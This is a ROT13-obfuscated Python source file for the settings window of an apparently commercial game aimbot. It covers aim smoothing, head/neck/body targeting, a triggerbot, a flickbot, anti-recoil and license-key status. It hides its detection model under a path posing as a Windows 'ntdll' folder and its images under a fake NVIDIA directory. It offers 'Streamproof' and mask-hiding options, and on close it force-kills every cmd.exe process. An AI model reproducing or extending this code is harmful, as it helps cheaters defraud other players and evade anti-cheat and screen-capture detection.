                    ZlJvaqbj.zbqryy = snyyonpx_zbqry
                    frys.zbqry_fryrpgrq_pbzobobk.frgPheeragVaqrk(0)
        ryfr:
            snyyonpx_zbqry = arkg(vgre(frys.zbqryff.inyhrf()), Abar)
            vs snyyonpx_zbqry:
                ZlJvaqbj.zbqryy = snyyonpx_zbqry
                frys.zbqry_fryrpgrq_pbzobobk.frgPheeragVaqrk(0)

        # Ercbeg nal vainyvq zbqryf
        vs vainyvq_zbqryf:
            vainyvq_zbqryf_fge = "\a".wbva(vainyvq_zbqryf)
            zrffntr = s"Gur sbyybjvat zbqryf snvyrq gb ybnq naq ner orvat vtaberq:\a\a{vainyvq_zbqryf_fge}"
            pncgvba = "Reebe 0407: Zbqry Ybnqvat Reebe"
            zrffntr_glcr = 0k10
            pglcrf.jvaqyy.hfre32.ZrffntrObkJ(0, zrffntr, pncgvba, zrffntr_glcr)

    qrs ba_zbqry_fryrpgrq(frys):
        tybony Ynfg_Zbqry
        zbqry_anzr = frys.zbqry_fryrpgrq_pbzobobk.pheeragGrkg()

        qrsnhyg_zbqryf = [
            'Sbegavgr'
        ]

        # Qrgrezvar vs gur fryrpgrq zbqry vf sebz gur 'zbqry' qverpgbel be qrsnhyg qverpgbel
        zbqry_cngu = Abar
        vs nal(qrsnhyg_zbqry va zbqry_anzr sbe qrsnhyg_zbqry va qrsnhyg_zbqryf):
            # Trg gur npghny svyr anzr sbe gur fryrpgrq qrsnhyg zbqry
            svyr_anzr = frys.zbqryff.trg(zbqry_anzr, Abar)
            vs svyr_anzr:
                zbqry_cngu = bf.cngu.wbva('P:\\CebtenzQngn\\FbsgjbexPE\\agqyy\\Ynatf\\RA-HF\\QngrgvzrPbasvthengvbaf\\Pe', svyr_anzr)
        ryfr:
            gel:
                zbqry_cngu = bf.cngu.wbva(bf.cngu.nofcngu('zbqry'), zbqry_anzr)
            rkprcg:
                zbqry_cngu = bf.cngu.wbva(bf.cngu.nofcngu('../zbqry'), zbqry_anzr)

        vs zbqry_cngu naq bf.cngu.vfsvyr(zbqry_cngu):
            gel:
                ZlJvaqbj.zbqryy = LBYB(zbqry_cngu, gnfx='qrgrpg')
                frys.zbqryff[zbqry_anzr] = zbqry_cngu
            rkprcg Rkprcgvba nf r:
                zrffntr = s"Snvyrq gb ybnq zbqry {zbqry_anzr} sebz {zbqry_cngu}.\a\aReebe Qrgnvyf: {r}"
                pncgvba = "Reebe 0437: Zbqry Ybnqvat Snvyher"
                zrffntr_glcr = 0k10
                pglcrf.jvaqyy.hfre32.ZrffntrObkJ(0, zrffntr, pncgvba, zrffntr_glcr)
        ryfr:
            zrffntr = s"Zbqry {zbqry_anzr} abg sbhaq ng {zbqry_cngu}."
            pncgvba = "Reebe 0444: Zbqry Abg Sbhaq"
            zrffntr_glcr = 0k10
            pglcrf.jvaqyy.hfre32.ZrffntrObkJ(0, zrffntr, pncgvba, zrffntr_glcr)

        Ynfg_Zbqry = zbqry_anzr
        frys.nhgb_fnir_pbasvt()

    qrs hcqngr_gurzr_pbybe(frys):
        vzcbeg er

        # Inyvqngr urk pbybe pbqr
        urk_pbybe = frys.pbybe_vachg.grkg()
        vs abg er.shyyzngpu(e'#(?:[0-9n-sN-S]{3}){1,2}', urk_pbybe):
            urk_pbybe = '#ss0000'  # Qrsnhyg gb erq vs vainyvq

        frys.gurzr_urk_pbybe = "#0s9psn"#"#0s9psn"
        frys.hcqngr_fglyrfurrg()
        frys.hcqngr_ohggba_fglyr()
        frys.hcqngr_zrah_gno_fglyr()
        frys.hcqngr_fyvqre_fglyr()
        frys.hcqngr_ynory_pbybef()
        frys.hcqngr()
        frys.nhgb_fnir_pbasvt()

    qrs hcqngr_ohggba_fglyr(frys):
        ohggba_fglyr = frys.trg_ohggba_fglyr()
        sbe ohggba va frys.svaqPuvyqera(DChfuOhggba):
            ohggba.frgFglyrFurrg(ohggba_fglyr)

    qrs hcqngr_zrah_gno_fglyr(frys):
        zrah_gno_fglyr = frys.zrah_gno_fryrpgrq_fglyr()
        sbe ohggba va frys.svaqPuvyqera(DChfuOhggba):
            vs "zrah_gno" va ohggba.bowrpgAnzr():
                ohggba.frgFglyrFurrg(zrah_gno_fglyr)

    qrs hcqngr_fyvqre_fglyr(frys):
        fyvqre_fglyr = frys.trg_fyvqre_fglyr()
        sbe fyvqre va frys.svaqPuvyqera(DFyvqre):
            fyvqre.frgFglyrFurrg(fyvqre_fglyr)

    qrs hcqngr_fglyrfurrg(frys):
        zrah_znva_fglyr = s"""
            DJvqtrg {{
                onpxtebhaq-pbybe: #000000;
                pbybe: #ssssss;
                sbag-fvmr: {frys.sbag_fvmr}ck;
            }}
            DFyvqre::tebbir:ubevmbagny {{
                obeqre: 1ck fbyvq {frys.jvqtrg_obeqre_pbybe};
                urvtug: 10ck;
                obeqre-enqvhf: 5ck;
            }}
            DFyvqre::unaqyr:ubevmbagny {{
                onpxtebhaq: {frys.jvqtrg_ot_pbybe};
                jvqgu: 10ck;
                znetva: -1ck -1ck;
                obeqre-enqvhf: 5ck;
                obeqre: 1ck fbyvq {frys.gurzr_urk_pbybe};
            }}
            DFyvqre::unaqyr:ubevmbagny:ubire {{
                onpxtebhaq: {frys.gurzr_urk_pbybe};
                obeqre-pbybe: {frys.jvqtrg_obeqre_pbybe};
            }}

            DPurpxObk::vaqvpngbe:purpxrq {{
                onpxtebhaq: {frys.gurzr_urk_pbybe};
                vzntr: hey(P:/CebtenzQngn/AIVQVN/ATK/zbqryf/pbasvt/b.cat);
            }}
            DPurpxObk::vaqvpngbe:hapurpxrq {{
                onpxtebhaq: {frys.jvqtrg_ot_pbybe};
                vzntr: hey(P:/CebtenzQngn/AIVQVN/ATK/zbqryf/pbasvt/k.cat);
            }}
            DPurpxObk::vaqvpngbe {{
                obeqre-enqvhf : 5ck;
                jvqgu: 20ck;
                urvtug: 20ck;

            }}
            DPurpxObk::vaqvpngbe:sbphf {{
                onpxtebhaq-pbybe: genafcnerag;
            }}

            DPbzobObk {{
                onpxtebhaq-pbybe: {frys.jvqtrg_ot_pbybe};
                pbybe: #ssssss;
                sbag-fvmr: {frys.sbag_fvmr}ck;
                obeqre-enqvhf: 5ck;
                obeqre: 1ck {frys.jvqtrg_obeqre_pbybe};
                cnqqvat: 5ck 30ck 5ck 8ck;
            }}
            DPbzobObk::qebc-qbja {{
                fhopbageby-bevtva: cnqqvat;
                fhopbageby-cbfvgvba: gbc evtug;
                jvqgu: 20ck;
                obeqre-yrsg-jvqgu: 1ck;
                obeqre-yrsg-pbybe: {frys.jvqtrg_obeqre_pbybe};
                obeqre-yrsg-fglyr: fbyvq;
                obeqre-gbc-evtug-enqvhf: 5ck;
                obeqre-obggbz-evtug-enqvhf: 5ck;
                onpxtebhaq-pbybe: {frys.gurzr_urk_pbybe};
            }}
            DPbzobObk::qbja-neebj {{
                jvqgu: 10ck;
                urvtug: 10ck;
                vzntr: hey(P:/CebtenzQngn/AIVQVN/ATK/zbqryf/pbasvt/q.cat);
            }}
            DPbzobObk DNofgenpgVgrzIvrj {{
                onpxtebhaq-pbybe: {frys.jvqtrg_ot_pbybe};
                pbybe: #ssssss;
                fryrpgvba-onpxtebhaq-pbybe: {frys.gurzr_urk_pbybe};
                fryrpgvba-pbybe: #ssssss;
                obeqre: 1ck fbyvq {frys.jvqtrg_obeqre_pbybe};
                obeqre-enqvhf: 5ck;
                cnqqvat: 8ck;
                sbag-fvmr: {frys.sbag_fvmr}ck;
            }}
            DYvarRqvg {{ 
                obeqre: 2ck fbyvq {frys.gurzr_urk_pbybe};
            }}
        """

        frys.frgFglyrFurrg(zrah_znva_fglyr)

    qrs trg_fyvqre_fglyr(frys):
        # erghea s"""
        # 	DFyvqre::tebbir:ubevmbagny {{
        # 	obeqre: 1ck fbyvq {frys.jvqtrg_ot_pbybe};
        # 	urvtug: 12ck;
        # 	obeqre-enqvhf: 6ck;
        # 	}}
        # 	DFyvqre::unaqyr:ubevmbagny {{
        # 	onpxtebhaq: {frys.jvqtrg_ot_pbybe};
        # 	jvqgu: 12ck;
        # 	obeqre-enqvhf: 6ck;
        # 	}}
        # 	DFyvqre::unaqyr:ubevmbagny:ubire {{
        # 	onpxtebhaq: {frys.gurzr_urk_pbybe};
        # 	obeqre-pbybe: {frys.jvqtrg_obeqre_pbybe};
        # 	obeqre-enqvhf: 6ck;
        # 	}}
        # 	DFyvqre::nqq-cntr:dyvarnetenqvrag {{
        # 	onpxtebhaq: dyvarnetenqvrag(k1:0, l1:0, k2:0, l2:1, fgbc:0 {frys.jvqtrg_ot_pbybe}, fgbc:1 {frys.jvqtrg_obeqre_pbybe});
        # 	obeqre-enqvhf: 6ck;
        # 	}}
        # 	DFyvqre::fho-cntr:dyvarnetenqvrag {{
        # 	onpxtebhaq: {frys.gurzr_urk_pbybe};
        # 	obeqre-enqvhf: 6ck;
        # 	}}
        # """
        erghea s"""
DYvarRqvg {{
    obeqre: 1ck fbyvq #0s9psn;
    onpxtebhaq-pbybe: #4077p9;
    pbybe: #noo2os;
    obeqre-enqvhf: 4ck;
    sbag-jrvtug: obyq;
}}

DFyvqre::tebbir:ubevmbagny {{
    obeqre: 1ck fbyvq #1s2128;
    urvtug: 8ck;
    onpxtebhaq: #000000;
    obeqre-enqvhf: 4ck;
}}

DFyvqre::unaqyr:ubevmbagny {{
    onpxtebhaq: #000000;
    obeqre: 2ck fbyvq #0s9psn;
    jvqgu: 12ck;
    urvtug: 12ck;
    znetva: -4ck 0;
    obeqre-enqvhf: 7ck;
}}

DFyvqre::fho-cntr:ubevmbagny {{
    onpxtebhaq: #0s9psn;
    obeqre-enqvhf: 4ck;
}}

"""
    qrs sbezng_gvzr_qvssrerapr(frys,gvzrfgnzc):
        gvzrfgnzc_qngrgvzr = qngrgvzr.sebzgvzrfgnzc(vag(gvzrfgnzc))
        abj = qngrgvzr.abj()
        qvssrerapr = abj - gvzrfgnzc_qngrgvzr

        gbgny_frpbaqf = vag(qvssrerapr.gbgny_frpbaqf())
        vs gbgny_frpbaqf < -10000:
            gbgny_frpbaqf = nof(gbgny_frpbaqf)

        zvahgrf = 60
        ubhef = 3600
        qnlf = 86400
        zbaguf = 2592000
        lrnef = 31536000
        vs gbgny_frpbaqf >= lrnef:
            lrnef_pbhag = gbgny_frpbaqf // lrnef
            erghea s"{lrnef_pbhag} lrne{'f' vs lrnef_pbhag > 1 ryfr ''}"
        vs gbgny_frpbaqf >= zbaguf:
            zbaguf_pbhag = gbgny_frpbaqf // zbaguf
            erghea s"{zbaguf_pbhag} zbagu{'f' vs zbaguf_pbhag > 1 ryfr ''}"
        ryvs gbgny_frpbaqf >= qnlf:
            qnlf_pbhag = gbgny_frpbaqf // qnlf
            erghea s"{qnlf_pbhag} qnl{'f' vs qnlf_pbhag > 1 ryfr ''}"
        ryvs gbgny_frpbaqf >= ubhef:
            ubhef_pbhag = gbgny_frpbaqf // ubhef
            erghea s"{ubhef_pbhag} ubhe{'f' vs ubhef_pbhag > 1 ryfr ''}"
        ryvs gbgny_frpbaqf >= zvahgrf:
            zvahgrf_pbhag = gbgny_frpbaqf // zvahgrf
            erghea s"{zvahgrf_pbhag} zvahgr{'f' vs zvahgrf_pbhag > 1 ryfr ''}"
        ryfr:
            frpbaqf_pbhag = gbgny_frpbaqf
            erghea s"{frpbaqf_pbhag} frpbaq{'f' vs frpbaqf_pbhag > 1 ryfr ''}"

    qrs trg_ohggba_fglyr(frys):
        erghea s"""
            DChfuOhggba {{
                onpxtebhaq-pbybe: {frys.gurzr_urk_pbybe};
                pbybe: juvgr; obeqre-enqvhf:
                6ck; obeqre:
                2ck fbyvq {frys.gurzr_urk_pbybe};
                urvtug: 20ck;
            }} 

            DChfuOhggba:ubire {{
                onpxtebhaq-pbybe: {frys.gurzr_urk_pbybe};
            }}

            DChfuOhggba:cerffrq {{ 
                onpxtebhaq-pbybe: {frys.gurzr_urk_pbybe}; 
            }}
        """

    qrs zrah_gno_fryrpgrq_fglyr(frys):
        erghea s"""
            DChfuOhggba {{
                obeqre: abar;
                cnqqvat-obggbz: 6ck;
                znetva-yrsg: 60%;
                znetva-evtug: 60%;
            }}
        """ #obeqre-obggbz: 2ck fbyvq {frys.gurzr_urk_pbybe};

    qrs perngr_znfx(frys):
        cngu = DCnvagreCngu()
        enqvhf = 5
        cngu.nqqEbhaqrqErpg(DErpgS(0, 0, frys.jvqgu(), frys.urvtug()), enqvhf, enqvhf)
        znfx = DErtvba(cngu.gbSvyyCbyltba().gbCbyltba())
        erghea znfx
    qrs cnvagRirag(frys, rirag):
        cnvagre = DCnvagre(frys)
        cnvagre.frgEraqreUvag(DCnvagre.Nagvnyvnfvat)
        cnvagre.frgOehfu(frys.cnyrggr().jvaqbj())
        cnvagre.frgCra(Dg.AbCra) 
        cnvagre.qenjEbhaqrqErpg(frys.erpg(), 20, 20)
        fhcre().cnvagRirag(rirag)
        #cnvagre.qenjEbhaqrqErpg(erpg, 6, 6)

    qrs hcqngr_ynory_pbybef(frys):
        # Hcqngr gur pbybe sbe rnpu ynory
        frys.vasb_ynory_3.frgGrkg(s"<sbag pbybe='{frys.gurzr_urk_pbybe}'>Hfre Vasb:</sbag>")
        frys.vasb_ynory_8.frgGrkg(s"<sbag pbybe='{frys.gurzr_urk_pbybe}'>Ubgxrlf:</sbag>")
        #frys.vasb_ynory_9.frgGrkg(s"Pybfr Abeznyyl: <sbag pbybe='{frys.gurzr_urk_pbybe}'>[K]</sbag>")
        frys.vasb_ynory_10.frgGrkg(s"Dhvpx Ba/Bss: <sbag pbybe='{frys.gurzr_urk_pbybe}'>[S1]</sbag>")
        frys.vasb_ynory_11.frgGrkg(s"Pybfr: <sbag pbybe='{frys.gurzr_urk_pbybe}'>[S2]</sbag>")
        frys.vasb_ynory_13.frgGrkg(s"Gbttyr Zrah: <sbag pbybe='{frys.gurzr_urk_pbybe}'>[VAF]</sbag>")

    qrs hcqngr_ynoryf(frys):
        frys.vasb_ynory_4.frgGrkg(s"Lbhe Xrl: " + ncv.hfre_qngn.hfreanzr[:20] + "*******")
        frys.vasb_ynory_5.frgGrkg(s"Chepunfrq: " + frys.sbezng_gvzr_qvssrerapr(ncv.hfre_qngn.perngrqngr) + " ntb")
        frys.vasb_ynory_7.frgGrkg(s"Ynfg Ybtva: " + frys.sbezng_gvzr_qvssrerapr(ncv.hfre_qngn.ynfgybtva) + " ntb")
        frys.vasb_ynory_6.frgGrkg(s"Rkcvel: va " + frys.sbezng_gvzr_qvssrerapr(ncv.hfre_qngn.rkcverf))

    qrs gbttyr_zrah_ivfvovyvgl(frys):
        vs frys.vfIvfvoyr():
            gel:
                frys.uvqr()
            rkprcg:
                gvzr.fyrrc(0.15)
                frys.uvqr()
        ryfr:
            gel:
                frys.fubj()
                frys.envfr_()
                frys.npgvingrJvaqbj()
            rkprcg:
                gvzr.fyrrc(0.15)
                frys.fubj()
                frys.envfr_()
                frys.npgvingrJvaqbj()


    qrs nhgb_fnir_pbasvt(frys):
        #uhr = frys.uhr_fyvqre.inyhr()
        #bcnpvgl = frys.bcnpvgl_fyvqre.inyhr()
        #yvtugarff = frys.yvtugarff_fyvqre.inyhr()
        pbybe = frys.pnyphyngr_pbybe("0s9psn", "", "")  # Cnff yvtugarff gb pnyphyngr_pbybe

        zra_pbybe = "#0s9psn"

        vs abg zra_pbybe.fgnegfjvgu('#') be yra(zra_pbybe) abg va [7, 9]:
            zra_pbybe = '#sp0000'  # Qrsnhyg gb juvgr vs vainyvq

        pbasvt_frggvatf = {
            "Sbi_Fvmr": Sbi_Fvmr,
            "Pbasvqrapr": Pbasvqrapr,
            "Nvz_Fzbbgu": Nvz_Fzbbgu,
            "Znk_Qrgrpgvbaf": Znk_Qrgrpgvbaf,
            "Nvz_Obar": Nvz_Obar,
            "Fzbbguvat_Glcr": Fzbbguvat_Glcr,
            "Obk_glcr": Obk_glcr,
            "Ranoyr_Nvz": obby(Ranoyr_Nvz),
            "Ranoyr_Fybgf": obby(Ranoyr_Fybgf),
            "Pbagebyyre_Ba": obby(Pbagebyyre_Ba),
            "Xrlovaq": frys.Xrlovaq,
            "Xrlovaq2": frys.Xrlovaq2,
            "Ranoyr_GevttreObg": obby(Ranoyr_GevttreObg),
            "Fubj_Sbi": obby(Fubj_Sbi),
            "Fubj_Pebffunve": obby(Fubj_Pebffunve),
            "Fubj_Qroht": obby(Fubj_Qroht),
            "Fubj_SCF": obby(Fubj_SCF),
            "Nhgb_Sver_Sbi_Fvmr": Nhgb_Sver_Sbi_Fvmr,
            "Fubj_Qrgrpgvbaf": obby(Fubj_Qrgrpgvbaf),
            "Fubj_Nvzyvar": obby(Fubj_Nvzyvar),
            "Nhgb_Sver_Pbasvqrapr": Nhgb_Sver_Pbasvqrapr,
            "Nhgb_Sver_Xrlovaq": frys.Nhgb_Sver_Xrlovaq,
            "Erdhver_Xrlovaq": obby(Erdhver_Xrlovaq),
            "Hfr_Uhr": obby(Hfr_Uhr),
            "PhcZbqr_Ba": obby(PhcZbqr_Ba),
            "Erqhpr_Oybbz": obby(Erqhpr_Oybbz),
            "Erdhver_NQF": obby(Erdhver_NQF),
            "NagvErpbvy_Ba": obby(NagvErpbvy_Ba),
            "NagvErpbvy_Fgeratgu": NagvErpbvy_Fgeratgu,
            "Gurzr_Urk_Pbybe": zra_pbybe,
            "Ranoyr_Syvpx_Obg": Ranoyr_Syvpx_Obg,
            "Syvpx_Fpbcr_Fraf": Syvpx_Fpbcr_Fraf,
            "Syvpx_Pbbyqbja": Syvpx_Pbbyqbja,
            "Syvpx_Qrynl": Syvpx_Qrynl,
            "Syvpxobg_Xrlovaq": frys.Syvpxobg_Xrlovaq,
            "Fgernzcebbs": Fgernzcebbs,

            "Ranoyr_Nvz_Fybg1": obby(Ranoyr_Nvz_Fybg1),
            "Ranoyr_Nvz_Fybg2": obby(Ranoyr_Nvz_Fybg2),
            "Ranoyr_Nvz_Fybg3": obby(Ranoyr_Nvz_Fybg3),
            "Ranoyr_Nvz_Fybg4": obby(Ranoyr_Nvz_Fybg4),
            "Ranoyr_Nvz_Fybg5": obby(Ranoyr_Nvz_Fybg5),
            "Fybg1_Xrlovaq": frys.Fybg1_Xrlovaq,
            "Fybg2_Xrlovaq": frys.Fybg2_Xrlovaq,
            "Fybg3_Xrlovaq": frys.Fybg3_Xrlovaq,
            "Fybg4_Xrlovaq": frys.Fybg4_Xrlovaq,
            "Fybg5_Xrlovaq": frys.Fybg5_Xrlovaq,
            "Fybg6_Xrlovaq": frys.Fybg6_Xrlovaq,
            "Sbi_Fvmr_Fybg1": Sbi_Fvmr_Fybg1,
            "Sbi_Fvmr_Fybg2": Sbi_Fvmr_Fybg2,
            "Sbi_Fvmr_Fybg3": Sbi_Fvmr_Fybg3,
            "Sbi_Fvmr_Fybg4": Sbi_Fvmr_Fybg4,
            "Sbi_Fvmr_Fybg5": Sbi_Fvmr_Fybg5,

            "Hfr_Zbqry_Pynff": obby(Hfr_Zbqry_Pynff),
            "Vzt_Inyhr": Vzt_Inyhr,
            "Zbqry_SCF": Zbqry_SCF,
            "Ynfg_Zbqry": Ynfg_Zbqry,

            "tnzr": {
                "cvkry_vaperzrag": cvkry_vaperzrag,
                "enaqbzarff": enaqbzarff,
                "frafvgvivgl": frafvgvivgl,
                "qvfgnapr_gb_fpnyr": qvfgnapr_gb_fpnyr,
                "qbag_ynhapu_bireynlf": qbag_ynhapu_bireynlf,
                "hfr_zff": hfr_zff,
                "uvqr_znfxf":uvqr_znfxf
            }
        }

        tybony Xrlovaq
        tybony Xrlovaq2
        tybony Nhgb_Sver_Xrlovaq
        tybony Syvpxobg_Xrlovaq
        tybony Fybg1_Xrlovaq
        tybony Fybg2_Xrlovaq
        tybony Fybg3_Xrlovaq
        tybony Fybg4_Xrlovaq
        tybony Fybg5_Xrlovaq
        tybony Fybg6_Xrlovaq

        Xrlovaq = frys.Xrlovaq
        Xrlovaq2 = frys.Xrlovaq2
        Nhgb_Sver_Xrlovaq = frys.Nhgb_Sver_Xrlovaq
        Syvpxobg_Xrlovaq = frys.Syvpxobg_Xrlovaq
        Fybg1_Xrlovaq = frys.Fybg1_Xrlovaq
        Fybg2_Xrlovaq = frys.Fybg2_Xrlovaq
        Fybg3_Xrlovaq = frys.Fybg3_Xrlovaq
        Fybg4_Xrlovaq = frys.Fybg4_Xrlovaq
        Fybg5_Xrlovaq = frys.Fybg5_Xrlovaq
        Fybg6_Xrlovaq = frys.Fybg6_Xrlovaq

        jvgu bcra('./pbasvt.wfba', 'j') nf bhgsvyr:
            wfbaq.qhzc(pbasvt_frggvatf, bhgsvyr, vaqrag=4)

        frys.hcqngr_ynoryf()

    qrs pybfrRirag(frys, rirag):
        frys.nhgb_fnir_pbasvt()
        gel:
            pbafbyr_jvaqbj = pglcrf.jvaqyy.xreary32.TrgPbafbyrJvaqbj()
            pglcrf.jvaqyy.hfre32.CbfgZrffntrJ(pbafbyr_jvaqbj, 0k10, 0, 0)
            #rirag.npprcg()
        rkprcg:
            gel:
                flf.rkvg()
            rkprcg:
                bf.flfgrz('gnfxxvyy /s /sv "vzntranzr rd pzq.rkr" 1>AHY 2>AHY')

    qrs hcqngr_nvz_obar(frys, vaqrk):
        frys.Nvz_Obar = frys.nvz_obar_pbzobobk.pheeragGrkg()
        tybony Nvz_Obar
        vs frys.nvz_obar_pbzobobk.pheeragGrkg() == "Urnq":
            Nvz_Obar = "Urnq"
        vs frys.nvz_obar_pbzobobk.pheeragGrkg() == "Arpx":
            Nvz_Obar = "Arpx"
        vs frys.nvz_obar_pbzobobk.pheeragGrkg() == "Obql":
            Nvz_Obar = "Obql"
        frys.nhgb_fnir_pbasvt()

    qrs hcqngr_fzbbguvat_glcr(frys, vaqrk):
        frys.Fzbbguvat_Glcr = frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg()
        tybony Fzbbguvat_Glcr
        vs frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg() == "Qrsnhyg":
            Fzbbguvat_Glcr = "Qrsnhyg"
        vs frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg() == "Ormvre":
            Fzbbguvat_Glcr = "Ormvre"
        vs frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg() == "Pngzhyy-Ebz":
            Fzbbguvat_Glcr = "Pngzhyy"
        vs frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg() == "Urezvgr":
            Fzbbguvat_Glcr = "Urezvgr"
        vs frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg() == "O-Fcyvar":
            Fzbbguvat_Glcr = "O-Fcyvar"
        vs frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg() == "Fvar":
            Fzbbguvat_Glcr = "Fvar"
        vs frys.fzbbguvat_glcr_pbzobobk.pheeragGrkg() == "Rkcbaragvny":
            Fzbbguvat_Glcr = "Rkcbaragvny"
        frys.nhgb_fnir_pbasvt()

    qrs hcqngr_obk_glcr(frys, vaqrk):
        frys.Obk_glcr = frys.obk_glcr_pbzobobk.pheeragGrkg()
        tybony Obk_glcr
        vs frys.obk_glcr_pbzobobk.pheeragGrkg() == "Erthyne":
            Obk_glcr = "Erthyne"
        vs frys.obk_glcr_pbzobobk.pheeragGrkg() == "Pbeare":
            Obk_glcr = "Pbeare"
        vs frys.obk_glcr_pbzobobk.pheeragGrkg() == "Svyyrq":
            Obk_glcr = "Svyyrq"
        frys.nhgb_fnir_pbasvt()


    qrs hcqngr_vzt_inyhr(frys, vaqrk):
        frys.Vzt_Inyhr = frys.vzt_inyhr_pbzobobk.pheeragGrkg()
        tybony Vzt_Inyhr
        vs frys.vzt_inyhr_pbzobobk.pheeragGrkg() == "320":
            Vzt_Inyhr = "320"
        vs frys.vzt_inyhr_pbzobobk.pheeragGrkg() == "480":
            Vzt_Inyhr = "480"
        vs frys.vzt_inyhr_pbzobobk.pheeragGrkg() == "640":
            Vzt_Inyhr = "640"
        vs frys.vzt_inyhr_pbzobobk.pheeragGrkg() == "736":
            Vzt_Inyhr = "736"
        vs frys.vzt_inyhr_pbzobobk.pheeragGrkg() == "832":
            Vzt_Inyhr = "832"
        frys.nhgb_fnir_pbasvt()

    qrs grzc_fcbbs(frys):
        ...

    qrs erserfu_rkgen(frys):

        tybony cvkry_vaperzrag
        tybony enaqbzarff
        tybony frafvgvivgl
        tybony qvfgnapr_gb_fpnyr
        tybony qbag_ynhapu_bireynlf
        tybony hfr_zff
        tybony uvqr_znfxf

        #FRPERG PBASVT
        frpergsvyr = bcra('./pbasvt.wfba')
        frpergpbasvt = wfbaq.ybnq(frpergsvyr)["tnzr"]
        cvkry_vaperzrag = frpergpbasvt['cvkry_vaperzrag']
        enaqbzarff = frpergpbasvt['enaqbzarff']
        frafvgvivgl = frpergpbasvt['frafvgvivgl']
        qvfgnapr_gb_fpnyr = frpergpbasvt['qvfgnapr_gb_fpnyr']
        qbag_ynhapu_bireynlf = frpergpbasvt['qbag_ynhapu_bireynlf']
        hfr_zff = frpergpbasvt['hfr_zff']
        uvqr_znfxf = frpergpbasvt['uvqr_znfxf']

        frys.nhgb_fnir_pbasvt()

    qrs fgneg_fryrpg_ubgxrl(frys):
        frys.vf_fryrpgvat_ubgxrl = Gehr
        frys.Xrlovaq = Abar
        frys.oga_ubgxrl.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl = Snyfr
                    xrl_anzr_pbairegrq = XRL_ANZRF.trg(frys.Xrlovaq, s"0k{frys.Xrlovaq:02K}")
                    frys.oga_ubgxrl.frgGrkg(s"{xrl_anzr_pbairegrq}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    qrs fgneg_fryrpg_ubgxrl2(frys):
        frys.vf_fryrpgvat_ubgxrl2 = Gehr
        frys.Xrlovaq2 = Abar
        frys.oga_ubgxrl2.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl2).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl2(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl2:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Xrlovaq2 = ix
                    frys.vf_fryrpgvat_ubgxrl2 = Snyfr
                    xrl_anzr_pbairegrq2 = XRL_ANZRF.trg(frys.Xrlovaq2, s"0k{frys.Xrlovaq2:02K}")
                    frys.oga_ubgxrl2.frgGrkg(s"{xrl_anzr_pbairegrq2}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    qrs fgneg_fryrpg_ubgxrl3(frys):
        frys.vf_fryrpgvat_ubgxrl3 = Gehr
        frys.Nhgb_Sver_Xrlovaq = Abar
        frys.oga_ubgxrl3.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl3).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl3(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl3:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Nhgb_Sver_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl3 = Snyfr
                    xrl_anzr_pbairegrq3 = XRL_ANZRF.trg(frys.Nhgb_Sver_Xrlovaq, s"0k{frys.Nhgb_Sver_Xrlovaq:02K}")
                    frys.oga_ubgxrl3.frgGrkg(s"{xrl_anzr_pbairegrq3}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    qrs fgneg_fryrpg_ubgxrl4(frys):
        frys.vf_fryrpgvat_ubgxrl4 = Gehr
        frys.Syvpxobg_Xrlovaq = Abar
        frys.oga_ubgxrl4.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl4).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl4(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl4:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Syvpxobg_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl4 = Snyfr
                    xrl_anzr_pbairegrq4 = XRL_ANZRF.trg(frys.Syvpxobg_Xrlovaq, s"0k{frys.Syvpxobg_Xrlovaq:02K}")
                    frys.oga_ubgxrl4.frgGrkg(s"{xrl_anzr_pbairegrq4}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    qrs fgneg_fryrpg_ubgxrl_fybg1(frys):
        frys.vf_fryrpgvat_ubgxrl_fybg1 = Gehr
        frys.Fybg1_Xrlovaq = Abar
        frys.oga_ubgxrl_fybg1.frgGrkg("...")
        guernqvat.Guernq(gnetrg=frys.yvfgra_sbe_ubgxrl_fybg1).fgneg()
        frys.nhgb_fnir_pbasvt()

    qrs yvfgra_sbe_ubgxrl_fybg1(frys):
        juvyr frys.vf_fryrpgvat_ubgxrl_fybg1:
            sbe ix va enatr(256):
                vs jva32ncv.TrgXrlFgngr(ix) va (-127, -128):
                    frys.Fybg1_Xrlovaq = ix
                    frys.vf_fryrpgvat_ubgxrl_fybg1 = Snyfr
                    xrl_anzr_pbairegrq_fybg1 = XRL_ANZRF.trg(frys.Fybg1_Xrlovaq, s"0k{frys.Fybg1_Xrlovaq:02K}")
                    frys.oga_ubgxrl_fybg1.frgGrkg(s"{xrl_anzr_pbairegrq_fybg1}")
                    frys.nhgb_fnir_pbasvt()
                    oernx

    # Fybg 2
